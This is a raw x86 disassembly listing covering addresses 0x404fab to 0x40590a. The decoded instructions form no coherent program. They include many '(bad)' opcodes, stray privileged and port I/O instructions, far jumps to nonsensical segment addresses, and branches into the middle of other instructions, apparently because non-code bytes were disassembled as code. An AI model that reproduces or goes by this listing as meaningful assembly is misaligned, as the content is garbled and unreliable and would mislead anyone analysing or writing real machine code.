  404fab:	push   DWORD PTR [ebx]
  404fad:	xchg   esp,eax
  404fae:	aam    0x5f
  404fb0:	xor    al,0xa1
  404fb2:	das    
  404fb3:	add    al,0x8c
  404fb5:	fs pop esi
  404fb7:	pop    ss
  404fb8:	fmul   DWORD PTR [eax]
  404fba:	fcom   QWORD PTR [edi+0x24]
  404fbd:	outs   dx,BYTE PTR ds:[esi]
  404fbe:	dec    eax
  404fbf:	popf   
  404fc0:	or     ebx,DWORD PTR [ebp+0x1721]
	...
  404fd6:	add    BYTE PTR [eax],al
  404fd8:	mov    ?,ebp
  404fda:	out    dx,eax
  404fdb:	cmp    BYTE PTR [ecx-0x5c],0xe1
  404fdf:	pop    ss
  404fe0:	cwde   
  404fe1:	or     DWORD PTR [ebx+esi*8-0x631a8116],edx
  404fe8:	pop    ecx
  404fe9:	inc    eax
  404fea:	or     DWORD PTR [ebp+edx*8+0x8],eax
  404fee:	push   es
  404fef:	or     esp,ecx
  404ff1:	jle    0x404fd6
  404ff3:	test   al,0xa3
  404ff5:	sbb    eax,0x7fe70929
  404ffa:	ror    BYTE PTR [esi-0x636ec7af],1
  405000:	cmp    DWORD PTR [eax-0x41fe912],esp
  405006:	pop    es
  405007:	cdq    
  405008:	mov    ds:0x9bbb6a08,eax
  40500d:	jle    0x404fac
  40500f:	stos   DWORD PTR es:[edi],eax
  405010:	jmp    0xa182:0x8b03e0d0
  405017:	stos   DWORD PTR es:[edi],eax
  405018:	jb     0x405005
  40501a:	mov    ebp,0x65827b9c
  40501f:	stos   DWORD PTR es:[edi],eax
  405020:	push   0xffffffeb
  405022:	lods   eax,DWORD PTR ds:[esi]
  405023:	pushf  
  405024:	imul   eax,DWORD PTR [edx-0x14bd5497],0xffffff9d
  40502b:	pushf  
  40502c:	jp     0x9d185367
  405032:	mov    ss,WORD PTR [esi]
  405034:	clc    
  405035:	cld    
  405036:	nop
  405037:	mov    ecx,0x62080843
	...
  405050:	dec    esp
  405051:	ins    BYTE PTR es:[edi],dx
  405052:	push   edi
  405053:	mov    al,ds:0xbc08a54d
  405058:	adc    al,0xf9
  40505a:	mov    ah,BYTE PTR ds:0x32236407
  405060:	or     al,0x8a
  405062:	add    al,0xe9
  405064:	jnp    0x4050bc
  405066:	mov    eax,esp
  405068:	inc    DWORD PTR [edi]
  40506a:	jnp    0x40501d
  40506c:	adc    dl,BYTE PTR [edx-0xc]
  40506f:	cdq    
  405070:	sbb    BYTE PTR [edx-0x3193befc],al
  405076:	pop    es
  405077:	jmp    0xd9b0258e
  40507c:	add    BYTE PTR [edx-0x1d7ffefc],al
  405082:	test   BYTE PTR [esi],0x6
  405085:	push   edx
  405086:	lock push es
  405088:	mov    ds:0xca8de008,al
  40508d:	xchg   esp,eax
  40508e:	or     dl,ah
  405090:	iret   
  405091:	adc    BYTE PTR [ecx],0xee
  405094:	cdq    
  405095:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405096:	neg    DWORD PTR [eax+ecx*1+0x65]
  40509a:	not    DWORD PTR [eax+edx*4-0x4]
  40509e:	or     dl,bh
  4050a0:	test   DWORD PTR [edi],0x81f7b183
  4050a6:	hlt    
  4050a7:	sar    DWORD PTR [ebp+0x26e907d1],1
  4050ad:	add    DWORD PTR [ecx+eax*8],0xaef6e0bd
	...
  4050c8:	add    edx,ebx
  4050ca:	push   edx
  4050cb:	mov    al,0x52
  4050cd:	cwde   
  4050ce:	or     BYTE PTR [ebx+edx*1],dh
  4050d1:	clc    
  4050d2:	mov    BYTE PTR [ebp-0x7108f980],ch
  4050d8:	add    eax,0x13007a11
  4050dd:	sub    esi,edi
  4050df:	push   eax
  4050e0:	popf   
  4050e1:	xchg   ecx,eax
  4050e2:	or     DWORD PTR [eax],eax
  4050e4:	and    eax,0x25c7103b
  4050e9:	xchg   ebx,eax
  4050ea:	rol    ebx,0xe8
  4050ed:	adc    eax,0x9b4083e4
  4050f2:	or     BYTE PTR [edx+eiz*1+0xe],dh
  4050f6:	jne    0x405108
  4050f8:	and    eax,0x48ff1197
  4050fd:	div    ebp
  4050ff:	jne    0x4050fe
  405101:	cmp    dl,bh
  405103:	(bad)  
  405104:	ret    0xf72b
  405107:	jne    0x4050de
  405109:	sub    DWORD PTR [ebp+0xc],edi
  40510c:	mov    dl,0xa5
  40510e:	add    al,ch
  405110:	jmp    0x17ce:0xacfff741
  405117:	add    BYTE PTR [eax],bl
  405119:	push   ss
  40511a:	in     al,0x83
  40511c:	adc    BYTE PTR [ebx+0xde17408],bl
  405122:	jne    0x405130
  405124:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405125:	xchg   esi,eax
  405126:	push   ds
  405127:	(bad)  
  405128:	cmp    BYTE PTR [ebx],al
  40512a:	div    BYTE PTR [ebp+0x0]
	...
  40513d:	add    BYTE PTR [eax],al
  40513f:	add    BYTE PTR [ebp-0x3d2944c6],bl
  405145:	sub    edi,esi
  405147:	jne    0x4050fa
  405149:	sub    DWORD PTR [ebp+0x8],edi
  40514c:	int    0x98
  40514e:	(bad)  
  405150:	push   edx
  405151:	fxch   st(1)
  405153:	or     al,0x75
  405155:	lds    eax,FWORD PTR [ebx-0x7ba1914]
  40515b:	(bad)  
  40515c:	mov    eax,0x5245e09c
  405161:	sub    esi,edi
  405163:	mov    DWORD PTR [eax-0x73827464],ebp
  405169:	out    dx,eax
  40516a:	or     dh,BYTE PTR [edx+edi*4+0x16]
  40516e:	sbb    BYTE PTR [esp+esi*1],cl
  405171:	int    0xb1
  405173:	inc    DWORD PTR [ebx+0x3]
  405176:	retf   
  405177:	je     0x405147
  405179:	jo     0x4051c3
  40517b:	lock fdiv QWORD PTR [esi+0x18]
  40517f:	or     al,0x34
  405181:	in     al,0xb1
  405183:	jmp    DWORD PTR [ebx]
  405185:	add    ecx,ebx
  405187:	je     0x4051e7
  405189:	jl     0x40519b
  40518b:	cld    
  40518c:	mov    ebx,?
  40518e:	cli    
  40518f:	(bad)  
  405190:	jle    0x40512d
  405192:	xchg   ebx,eax
  405193:	jne    0x405195
  405195:	(bad)  
  405196:	sbb    al,bh
  405198:	in     al,0xc2
  40519a:	lods   eax,DWORD PTR ds:[esi]
  40519b:	push   ebx
  40519d:	repnz retf 0x7d75
  4051a1:	scas   al,BYTE PTR es:[edi]
  4051a2:	sbb    BYTE PTR [eax],dl
	...
  4051b8:	jecxz  0x4051da
  4051ba:	lahf   
  4051bb:	jmp    DWORD PTR [ecx-0x5d]
  4051be:	xchg   edx,eax
  4051bf:	jne    0x405145
  4051c1:	xchg   ebx,eax
  4051c2:	inc    edx
  4051c3:	dec    ebx
  4051c5:	mov    es,WORD PTR [eax-0x5cd443bb]
  4051cb:	(bad)  
  4051cc:	(bad)  
  4051ce:	nop
  4051cf:	(bad)  
  4051d0:	cmp    edi,esp
  4051d2:	mov    ds:0x90eec586,al
  4051d7:	leave  
  4051d8:	into   
  4051d9:	test   DWORD PTR [edx],0x8cd00755
  4051df:	les    ebx,FWORD PTR [esi+edx*8+0x27740c06]
  4051e6:	mov    dl,0xff
  4051e8:	add    DWORD PTR [edi+esi*1+0xc00f0c],0x0
  4051f0:	clc    
  4051f1:	scas   al,BYTE PTR es:[edi]
  4051f2:	xchg   ecx,eax
  4051f3:	jne    0x40518d
  4051f5:	xchg   esp,eax
  4051f6:	cdq    
  4051f7:	inc    esp
  4051f8:	inc    edx
  4051f9:	add    eax,0x804c0d96
  4051fe:	rol    BYTE PTR [esi-0x66cefb37],cl
  405204:	rcr    DWORD PTR [eax+0x5629199],0x76
  40520b:	or     eax,0x82c2804c
  405210:	mov    cl,0x8
  405212:	loope  0x405217
  405214:	jl     0x4051aa
  405216:	shl    dl,cl
  405218:	and    bh,BYTE PTR [edi-0xf]
  40521b:	cwde   
	...
  405230:	mov    eax,ds:0x140f5e08
  405235:	add    eax,0xf6f40bdc
  40523a:	dec    esi
  40523b:	cdq    
  40523c:	add    edx,DWORD PTR [edi]
  40523e:	lods   al,BYTE PTR ds:[esi]
  40523f:	xchg   ebx,eax
  405240:	pop    esp
  405241:	cld    
  405242:	les    edi,FWORD PTR [eax+0xf2604f3]
  405248:	cwde   
  405249:	cld    
  40524a:	les    edi,FWORD PTR [edx-0x39c7fb1d]
  405250:	mov    BYTE PTR [esp+esi*4+0x2d10e08c],dl
  405257:	xchg   esp,eax
  405258:	pop    edi
  405259:	mov    ecx,0x9c39992a
  40525e:	sbb    DWORD PTR [ecx],ebp
  405260:	fiadd  DWORD PTR [esi+edi*8]
  405263:	mov    cl,BYTE PTR [ecx-0x64]
  405266:	bound  edx,QWORD PTR [edi]
  405268:	xchg   esp,eax
  405269:	xchg   esp,eax
  40526a:	push   ebp
  40526b:	inc    edx
  40526c:	mov    ds:0xb7abf97e,eax
  405271:	out    0xdd,al
  405273:	cwde   
  405274:	xchg   esp,edx
  405276:	pop    esp
  405277:	(bad)  
  405278:	sbb    BYTE PTR [edx-0x4f],bl
  40527b:	xor    eax,DWORD PTR [ebx+0x1eabf98a]
  405281:	jecxz  0x40528a
  405283:	mov    dh,0x14
  405285:	nop
  405286:	enter  0x7235,0x15
  40528a:	jne    0x405231
  40528c:	(bad)  
  40528d:	xchg   esp,eax
  40528e:	sbb    cl,ch
  405290:	and    BYTE PTR [edi+esi*8+0x1c],0x0
	...
  4052a8:	hlt    
  4052a9:	add    edi,DWORD PTR [ebp-0x6f]
  4052ac:	idiv   DWORD PTR [ecx-0x6fdb7916]
  4052b2:	enter  0x8ef5,0x57
  4052b6:	test   DWORD PTR [eax+ebx*1],ebp
  4052b9:	gs loopne 0x4052a5
  4052bc:	in     al,0x3
  4052be:	mul    DWORD PTR [esi-0x6e]
  4052c1:	mov    eax,fs
  4052c3:	sub    edi,edx
  4052c5:	add    esi,edi
  4052c7:	bound  ecx,QWORD PTR [eax+0x60]
  4052ca:	shr    DWORD PTR [ebx],0xb
  4052cd:	add    al,0x5c
  4052cf:	jb     0x4052fc
  4052d1:	push   ss
  4052d2:	int3   
  4052d3:	jne    0x4052ea
  4052d5:	add    al,0xf7
  4052d7:	cs jb  0x405316
  4052da:	imul   BYTE PTR [esi]
  4052dc:	add    al,0x95
  4052de:	or     cl,ch
  4052e0:	(bad)  
  4052e1:	cmovge ebp,ebp
  4052e4:	mov    ah,dl
  4052e6:	jnp    0x4052d4
  4052e8:	bsr    ecx,DWORD PTR [eax]
  4052eb:	xchg   esp,eax
  4052ec:	retf   0x6fec
  4052ef:	call   0x7537e783
  4052f4:	xchg   ebx,eax
  4052f5:	in     al,dx
  4052f6:	aam    0xa
  4052f8:	adc    al,0x4
  4052fa:	add    ebp,DWORD PTR [ecx]
  4052fc:	call   0x855:0x4be16093
  405303:	fidivr WORD PTR [ebp-0x70]
  405306:	loopne 0x4052fa
  405308:	fild   DWORD PTR [ebx]
  40530a:	test   edx,0x0
	...
  405320:	xchg   ebp,eax
  405321:	ins    BYTE PTR es:[edi],dx
  405322:	cmc    
  405323:	add    BYTE PTR [edx-0x3f00f7a7],bh
  405329:	mov    eax,fs
  40532b:	or     al,0x19
  40532d:	sub    esi,edi
  40532f:	mov    eax,esi
  405331:	pusha  
  405332:	idiv   bh
  405334:	sub    dh,BYTE PTR [eax-0x689afeca]
  40533a:	test   DWORD PTR [ebp-0x8d5d9],eax
  405340:	test   DWORD PTR [eax],esi
  405342:	mov    eax,ds
  405344:	or     ch,BYTE PTR [ebx]
  405346:	test   DWORD PTR [ebp-0x8d619],eax
  40534c:	xchg   ebp,eax
  40534d:	sub    edi,DWORD PTR [ebp-0x8d44448]
  405353:	call   0x482a5b
  405358:	pushf  
  405359:	adc    eax,0x2bbafeb4
  40535e:	dec    eax
  40535f:	(bad)  
  405361:	inc    BYTE PTR [edi]
  405363:	add    ch,dh
  405365:	or     ebx,DWORD PTR [ebp-0x8d4443e]
  40536b:	mul    edi
  40536d:	push   es
  40536e:	idiv   edi
  405370:	cmc    
  405371:	cdq    
  405372:	mov    WORD PTR [ebx-0x72f7690b],es
  405378:	daa    
  405379:	sti    
  40537a:	inc    esi
  40537b:	push   0x495b76
  405380:	lea    ebx,[ebx]
  405382:	retf   
	...
  405397:	add    BYTE PTR [ebp-0x4f8a3773],dh
  40539d:	das    
  40539e:	les    eax,FWORD PTR [eax]
  4053a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053a1:	xchg   esi,eax
  4053a2:	test   DWORD PTR [ebp-0x8d589],edx
  4053a8:	sbb    BYTE PTR [ebp+0x24],dl
  4053ab:	push   eax
  4053ac:	cmp    eax,0x8c414725
  4053b1:	in     eax,dx
  4053b2:	mov    ds:0xaec4f72,al
  4053b7:	or     ecx,DWORD PTR [ecx+eax*8+0x9]
  4053bb:	jmp    0x4b3feb
  4053c0:	jae    0x405383
  4053c2:	add    al,ch
  4053c4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053c5:	into   
  4053c6:	popf   
  4053c7:	call   DWORD PTR [edi-0x1bf0e7d5]
  4053cd:	addr16 inc ebx
  4053cf:	inc    ecx
  4053d0:	mov    WORD PTR [edx],gs
  4053d2:	sbb    BYTE PTR [esp+esi*1],cl
  4053d5:	stos   DWORD PTR es:[edi],eax
  4053d6:	mov    bl,0xff
  4053d8:	inc    ebx
  4053d9:	daa    
  4053da:	add    DWORD PTR [edx-0x74],ebp
  4053dd:	sbb    BYTE PTR [eax],0xc
  4053e0:	and    al,0x97
  4053e2:	mov    bl,0xff
  4053e4:	sub    esp,DWORD PTR [ecx+0x78]
  4053e7:	ret    0x7b22
  4053ea:	sahf   
  4053eb:	lea    edi,[esi+0x24503a8f]
  4053f1:	sbb    esi,DWORD PTR [edx-0x61c3f401]
  4053f7:	jne    0x40539d
  4053f9:	pop    edx
  4053fa:	sbb    BYTE PTR [eax+eax*1],dl
	...
  40540d:	add    BYTE PTR [eax],al
  40540f:	add    bl,bh
  405411:	dec    eax
  405412:	sti    
  405413:	dec    edi
  405414:	repz inc eax
  405416:	add    ebp,eax
  405418:	fdiv   QWORD PTR [ecx+0x4ff4ff9e]
  40541e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40541f:	(bad)  
  405420:	(bad)  [esi-0x28b172d5]
  405426:	add    DWORD PTR [ebp-0x616e00],0xf
  40542d:	sbb    ebx,edi
  40542f:	inc    DWORD PTR [eax-0x13]
  405432:	mov    eax,ds:0xfb80b312
  405437:	(bad)  
  405438:	loope  0x405401
  40543a:	popf   
  40543b:	jmp    DWORD PTR [ebx-0x3072266c]
  405441:	xchg   esp,eax
  405442:	loope  0x40544c
  405444:	int3   
  405445:	mov    BYTE PTR [esp+ebp*1],bl
  405448:	inc    eax
  405449:	dec    esp
  40544a:	and    BYTE PTR [ebx+eax*4],al
  40544d:	xchg   ebp,edi
  40544f:	stos   DWORD PTR es:[edi],eax
  405450:	popf   
  405451:	fnsave [ebp+0x75477395]
  405457:	xchg   esi,eax
  405458:	imul   eax,DWORD PTR [ecx],0x11
  40545b:	lods   al,BYTE PTR ds:[esi]
  40545c:	(bad)
  40545f:	xchg   ebp,eax
  405460:	mov    esp,0x53fc1415
  405465:	test   ebp,ebp
  405467:	xchg   esp,eax
  405468:	shr    DWORD PTR [eax-0x73466acf],0x8e
  40546f:	das    
  405470:	xchg   esp,eax
  405471:	in     eax,dx
  405472:	in     al,0x94
	...
  405488:	mov    ecx,0xa19511a8
  40548d:	mov    WORD PTR [ecx+0x6e012130],cs
  405493:	lods   al,BYTE PTR ds:[esi]
  405494:	into   
  405495:	jmp    0x1741e9ef
  40549a:	and    edx,DWORD PTR [esi-0x6b4efef5]
  4054a0:	cmp    DWORD PTR [eax+0x4f],eax
  4054a3:	xchg   ebp,eax
  4054a4:	sti    
  4054a5:	jmp    0x40542d
  4054a7:	ret    0x948c
  4054aa:	les    ebx,FWORD PTR fs:[ebx-0x1c69cfe9]
  4054b1:	add    BYTE PTR [esi],ch
  4054b3:	dec    edi
  4054b4:	sbb    BYTE PTR [edx],al
  4054b6:	push   ss
  4054b7:	xchg   ebp,eax
  4054b8:	in     al,0x32
  4054ba:	and    eax,DWORD PTR [esp+ecx*4]
  4054bd:	add    DWORD PTR [esp+ebx*2-0x3e],ebx
  4054c1:	add    BYTE PTR [esi],cl
  4054c3:	lods   al,BYTE PTR ds:[esi]
  4054c4:	sahf   
  4054c5:	jmp    0xd605e9bf
  4054ca:	pop    es
  4054cb:	fisttp QWORD PTR [edi+0x75fd8367]
  4054d1:	xchg   esp,eax
  4054d2:	neg    DWORD PTR [esp+ebx*4+0x1]
  4054d6:	jge    0x4054d1
  4054d8:	clc    
  4054d9:	xchg   BYTE PTR [esi+edx*8],al
  4054dc:	call   0xf700:0x1a0ee08c
  4054e3:	mov    al,0x4d
  4054e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4054e6:	or     BYTE PTR [eax*1+0x3cf6f1],dl
	...
  4054fd:	add    BYTE PTR [eax],al
  4054ff:	add    BYTE PTR [esp+ebp*8-0x76db8],dl
  405506:	add    ch,BYTE PTR [ecx+0x14f79e8b]
  40550c:	pop    eax
  40550d:	push   eax
  40550e:	loopne 0x4054b6
  405510:	add    eax,0x1939f700
  405515:	mov    dl,BYTE PTR [eax]
  405517:	xchg   BYTE PTR [edx-0x7d81a758],cl
  40551d:	mov    eax,fs
  40551f:	aaa    
  405520:	add    BYTE PTR [eax],al
  405522:	test   DWORD PTR [ecx+0x66f6e6e0],0xe91bd346
  40552c:	bound  ecx,QWORD PTR [ebx]
  40552e:	in     al,0x56
  405530:	call   0x7cfe:0xffd4f7a8
  405537:	cmc    
  405538:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405539:	call   0x36b0:0xec87b4f7
  405540:	add    BYTE PTR [eax],al
  405542:	div    DWORD PTR [ebx+esi*8+0xf97cfe]
  405549:	mov    al,BYTE PTR [ebx+edx*4]
  40554c:	in     al,dx
  40554d:	(bad)  
  40554e:	jl     0x405531
  405550:	div    DWORD PTR [esi]
  405552:	test   DWORD PTR [esi],0x7d0018
  405558:	fldcw  WORD PTR [eax]
  40555a:	jge    0x40556c
  40555c:	mov    dl,0x91
  40555e:	add    al,0x6a
  405560:	shr    DWORD PTR [eax],0x7d
  405563:	or     BYTE PTR [eax],al
	...
  405575:	add    BYTE PTR [eax],al
  405577:	add    BYTE PTR [ebp-0x4d00087c],cl
  40557d:	inc    ecx
  40557e:	retf   0xa510
  405581:	mov    esp,0xccf6ec83
  405586:	not    DWORD PTR [ebx-0x45]
  405589:	mov    ebx,0x4dfedb23
  40558e:	add    al,0xff
  405590:	jne    0x4055a4
  405592:	dec    ebp
  405593:	clc    
  405594:	and    bl,BYTE PTR [ebp+0x24a88f00]
  40559a:	iret   
  40559b:	inc    ebp
  40559c:	stc    
  40559d:	xchg   edi,eax
  40559e:	or     BYTE PTR [eax],al
  4055a0:	gs push ss
  4055a2:	xor    eax,0x8596eb2
  4055a7:	add    BYTE PTR [ecx+0x3d7d8bc4],bl
  4055ad:	xchg   ebx,eax
  4055ae:	jl     0x405606
  4055b0:	mov    al,ds:0x8f50f84d
  4055b5:	cdq    
  4055b6:	bound  eax,QWORD PTR [eax]
  4055b8:	(bad)  
  4055b9:	cwde   
  4055ba:	mov    edi,DWORD PTR [ebp+0x15]
  4055bd:	xchg   ebx,eax
  4055be:	jl     0x4055c5
  4055c0:	mov    dl,0x9d
  4055c2:	sbb    bl,ch
  4055c4:	mul    DWORD PTR [eax+0x13f56a08]
  4055ca:	dec    ebp
  4055cb:	clc    
  4055cc:	adc    eax,0x3eb21d22
  4055d1:	pop    eax
  4055d2:	or     BYTE PTR [ebx],cl
  4055d4:	mov    ch,0x9c
  4055d6:	daa    
  4055d7:	xor    DWORD PTR [eax],0x27
  4055da:	or     BYTE PTR [eax+eax*1+0x0],dh
	...
  4055ee:	add    BYTE PTR [eax],al
  4055f0:	mov    esp,0x5e0c4d7d
  4055f5:	push   ebp
  4055f6:	clc    
  4055f7:	cmp    ecx,DWORD PTR [ebp+esi*8-0x6eb0e8ef]
  4055fe:	ja     0x405675
  405600:	rol    BYTE PTR [ecx+0x30070819],0x9b
  405607:	jecxz  0x405597
  405609:	cli    
  40560a:	outs   dx,BYTE PTR ds:[esi]
  40560b:	mov    ecx,DWORD PTR [ecx-0x1f]
  40560e:	cdq    
  40560f:	jne    0x4055ad
  405611:	test   DWORD PTR [ebx],ecx
  405613:	call   FWORD PTR [ecx]
  405615:	jmp    0xec8d3cac
  40561a:	or     cl,BYTE PTR [ebx+0x5b3aaf4f]
  405620:	inc    ebp
  405621:	sub    dh,bh
  405623:	(bad)  
  405624:	fadd   DWORD PTR [edx+0x48508397]
  40562a:	ds push esi
  40562c:	mov    ebx,0xcd504953
  405631:	jmp    0x4055c5
  405633:	ins    BYTE PTR es:[edi],dx
  405634:	dec    ebp
  405635:	in     al,dx
  405636:	or     cl,BYTE PTR [ebx-0x3bfd09c]
  40563c:	mov    ebx,gs
  40563e:	or     al,BYTE PTR [eax]
  405640:	xchg   DWORD PTR [ebx],ebp
  405642:	pop    ds
  405643:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405645:	aam    0x3a
  405647:	inc    ecx
  405648:	mov    WORD PTR [edx-0x13b30b6c],ds
  40564e:	or     cl,BYTE PTR [ebx]
  405650:	dec    esp
  405651:	loopne 0x40563c
  405653:	mov    al,BYTE PTR [eax]
	...
  405665:	add    BYTE PTR [eax],al
  405667:	add    BYTE PTR [esp+eiz*8],bl
  40566a:	and    al,0x50
  40566c:	dec    ebp
  40566d:	jmp    0x4056ac
  40566f:	call   0x4c0263
  405674:	xchg   DWORD PTR [ebx+0x54071e1f],ebp
  40567a:	mov    BYTE PTR [ebp-0x18],al
  40567d:	sbb    edx,DWORD PTR [ebx+0xaebccec]
  405683:	push   eax
  405684:	fist   DWORD PTR [esi+esi*1-0x1effae7a]
  40568b:	pop    ss
  40568c:	xchg   esi,eax
  40568d:	cmp    al,0xe0
  40568f:	add    ecx,DWORD PTR [esp+edx*4-0x34a8ce5a]
  405696:	and    DWORD PTR [ebx-0x74],ecx
  405699:	xchg   esp,eax
  40569a:	loope  0x40569f
  40569c:	dec    ebx
  40569d:	pop    esi
  40569e:	call   0xf9f:0x6a67cfbc
  4056a5:	fnop   
  4056a7:	test   DWORD PTR [ecx+0x6e],edx
  4056aa:	cmp    al,BYTE PTR [ebx-0x74]
  4056ad:	xchg   esp,eax
  4056ae:	push   ebp
  4056af:	test   BYTE PTR [esi],0xbf
  4056b2:	push   ebx
  4056b3:	cmp    eax,0x17e194cd
  4056b8:	test   DWORD PTR [ecx],edx
  4056ba:	hlt    
  4056bb:	sbb    edi,edx
  4056bd:	push   ebx
  4056be:	loope  0x4056c3
  4056c0:	fst    DWORD PTR [ebp-0x6b73fc87]
  4056c6:	loope  0x405682
  4056c8:	dec    edi
  4056c9:	cvttps2pi mm1,QWORD PTR [esi+0x0]
	...
  4056e0:	push   edx
  4056e1:	xchg   esp,eax
  4056e2:	loope  0x4056ad
  4056e4:	int3   
  4056e5:	xchg   ebx,eax
  4056e6:	loope  0x4056b1
  4056e8:	int3   
  4056e9:	xchg   edx,eax
  4056ea:	loope  0x4056b5
  4056ec:	int3   
  4056ed:	xchg   ecx,eax
  4056ee:	loope  0x4056b9
  4056f0:	int3   
  4056f1:	cwde   
  4056f2:	loope  0x4056bd
  4056f4:	int3   
  4056f5:	xchg   edi,eax
  4056f6:	in     al,dx
  4056f7:	jle    0x4056ca
  4056f9:	or     BYTE PTR [ecx-0x1e9573e3],dh
  4056ff:	sbb    eax,0x1de16a8c
  405704:	mov    WORD PTR [edx-0x1f],gs
  405707:	sbb    ebp,DWORD PTR [edx+edx*4-0x4b99fc1f]
  40570e:	fild   DWORD PTR ds:0x33085719
  405714:	cwde   
  405715:	std    
  405716:	sbb    al,0xbf
  405718:	cwde   
  405719:	push   ebx
  40571a:	or     dl,dh
  40571c:	iret   
  40571d:	xchg   BYTE PTR [edx],cl
  40571f:	xor    cl,dl
  405721:	aam    0x4c
  405723:	sbb    DWORD PTR [eax+0x3ae90894],ecx
  405729:	push   edi
  40572a:	clc    
  40572b:	cdq    
  40572c:	sbb    al,0x87
  40572e:	cld    
  40572f:	xchg   ebx,eax
  405730:	(bad)  
  405731:	std    
  405732:	sbb    al,0x7b
  405734:	pusha  
  405735:	push   ebx
  405736:	or     dl,ah
  405738:	iret   
  405739:	xchg   BYTE PTR [edi],cl
  40573b:	scas   al,BYTE PTR es:[edi]
  40573c:	dec    edx
  40573d:	add    al,0x8
  40573f:	jmp    0x5d37ebd3
	...
  405758:	and    al,0xfc
  40575a:	sbb    al,0x57
  40575c:	mov    ecx,0xca720855
  405761:	add    al,0xc1
  405763:	stos   BYTE PTR es:[edi],al
  405764:	mov    ds:0x4b6ae40f,al
  405769:	or     eax,0x64d82485
  40576e:	pusha  
  40576f:	call   0x9148ad13
  405774:	call   0xc88f:0x7f96f6f6
  40577b:	adc    eax,0x71751786
  405780:	cmp    eax,DWORD PTR [ebx+0x4d26c63]
  405786:	pop    eax
  405787:	and    edx,0x12e907d4
  40578d:	aad    0x6f
  40578f:	(bad)  
  405790:	mov    WORD PTR [edx+0x4d],es
  405793:	pop    esi
  405794:	mov    edi,0x1dacbe8b
  405799:	gs pop es
  40579b:	xchg   edi,eax
  40579c:	push   edx
  40579d:	stc    
  40579e:	push   edi
  40579f:	add    dl,bh
  4057a1:	pop    ebp
  4057a2:	dec    ebp
  4057a3:	cld    
  4057a4:	add    eax,0x9e45be95
  4057a9:	mov    DWORD PTR [edi],0x580a30b6
  4057af:	rdpmc  
  4057b1:	push   edx
  4057b2:	icebp  
  4057b3:	push   eax
  4057b4:	mov    edx,0x5f84d5d
  4057b9:	xchg   ebp,eax
  4057ba:	mov    edi,0x45
	...
  4057cf:	add    BYTE PTR [ebx-0x1f48f839],ah
  4057d5:	and    ebx,DWORD PTR [eax-0x1]
  4057d8:	and    BYTE PTR [edi],ah
  4057da:	pusha  
  4057db:	push   es
  4057dc:	add    eax,0xf08d0857
  4057e1:	jnp    0x40583b
  4057e3:	call   0x4828f3
  4057e8:	test   ah,0x3b
  4057eb:	lea    esi,[eax-0x6417a7ec]
  4057f1:	dec    ebx
  4057f2:	or     BYTE PTR [eax],al
  4057f4:	xchg   ebp,eax
  4057f5:	adc    eax,0x98858c4d
  4057fa:	or     DWORD PTR [eax-0x4c],edx
  4057fd:	nop
  4057fe:	loopne 0x4057ed
  405800:	inc    ebp
  405801:	or     esi,edi
  405803:	call   0x379489
  405808:	cld    
  405809:	(bad)  
  40580a:	pop    esp
  40580b:	mov    ecx,DWORD PTR [ecx]
  40580d:	adc    esp,ecx
  40580f:	sub    al,0xa
  405811:	or     esi,edi
  405813:	push   ebx
  405814:	xchg   edx,eax
  405815:	sahf   
  405816:	or     BYTE PTR [edx+0x35],ch
  405819:	or     bh,BYTE PTR [ebp+0x8]
  40581c:	or     eax,0xaaffd917
  405821:	jns    0x405870
  405823:	cld    
  405824:	cmp    eax,0x2bef0890
  405829:	or     edi,DWORD PTR [ebp+0x8]
  40582c:	mov    WORD PTR [ebp-0x58],ss
  40582f:	sar    bl,1
  405831:	dec    ecx
  405832:	adc    al,0x9c
	...
  405848:	mov    ebp,gs
  40584a:	or     cl,BYTE PTR [ebp-0x7a32ef]
  405850:	jecxz  0x40586e
  405852:	xchg   ebx,eax
  405853:	pop    eax
  405854:	shr    BYTE PTR [ecx+0xd09c787],0x86
  40585b:	dec    ebx
  40585d:	js     0x40586b
  40585f:	add    BYTE PTR [eax+esi*2-0x76449f7f],cl
  405866:	xchg   DWORD PTR [eax-0x5c],edx
  405869:	dec    eax
  40586a:	inc    edi
  40586b:	add    BYTE PTR [esi+eiz*8+0x6fbe2bb3],cl
  405872:	pop    ecx
  405873:	je     0x405810
  405875:	jmp    0x6dc043ff
  40587a:	(bad)  
  40587b:	inc    DWORD PTR [eax]
  40587d:	icebp  
  40587e:	inc    eax
  40587f:	add    DWORD PTR [ebx+ebp*8+0x605e0b0a],ecx
  405886:	or     eax,esi
  405888:	mov    ebp,ebx
  40588a:	dec    ebp
  40588b:	inc    ecx
  40588c:	or     eax,0x8c008ad5
  405891:	jmp    0x4058ab
  405893:	in     eax,0x87
  405895:	sub    ebx,DWORD PTR [edi]
  405897:	push   ss
  405898:	in     al,0xf
  40589a:	or     eax,DWORD PTR [eax]
  40589c:	mov    WORD PTR [eax-0x80],gs
  40589f:	pusha  
  4058a0:	inc    ebx
  4058a1:	and    eax,DWORD PTR [esi-0xb5ec4b0]
  4058a7:	out    0xf0,eax
  4058a9:	sbb    eax,DWORD PTR [esi+0xff]
	...
  4058bf:	add    BYTE PTR [edi],dh
  4058c1:	call   0xebf658d6
  4058c6:	test   DWORD PTR [ebp-0x7c],esi
  4058c9:	adc    edx,DWORD PTR [ebp-0x30]
  4058cc:	adc    edx,DWORD PTR [ebp-0x8266492]
  4058d2:	push   ebp
  4058d3:	mov    ds,WORD PTR [ecx+edi*8-0x2d]
  4058d7:	sti    
  4058d8:	rep outs dx,BYTE PTR ds:[esi]
  4058da:	xor    DWORD PTR [esi+0x7e16cf3],ecx
  4058e0:	mov    WORD PTR [ecx+ebx*2+0x3df9bfc5],ss
  4058e7:	jl     0x4058fa
  4058e9:	pop    ecx
  4058ea:	es mov ss,ebx
  4058ed:	ins    BYTE PTR es:[edi],dx
  4058ee:	add    cl,BYTE PTR cs:[esp+edx*4-0x69fa7ea]
  4058f6:	sbb    eax,0xf196248e
  4058fb:	add    ecx,DWORD PTR [esp+ebp*2-0x6b73f81f]
  405902:	sbb    eax,ebp
  405904:	loop   0x40589a
  405906:	loope  0x40593b
  405908:	fwait
  405909:	aas    
  40590a:	test   DWORD PTR [esi+0x17edf993],ecx
